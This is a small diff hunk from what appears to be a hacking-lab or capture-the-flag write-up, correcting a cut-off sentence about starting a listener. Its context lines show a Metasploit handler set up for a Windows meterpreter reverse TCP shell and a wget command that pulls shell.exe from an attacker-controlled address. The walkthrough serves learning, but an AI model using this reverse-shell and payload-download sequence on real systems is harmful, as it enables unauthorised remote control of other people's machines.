@@ -224,7 +224,7 @@ LPORT => 1337
 msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
 ```
 
-Ill set all the correct options that were set in msfvenom and then run with listener wi
+Ill set all the correct options that were set in msfvenom and then run with listener with `run`
 
 ```python
 wget http://10.10.14.61/shell.exe -o shell.exe
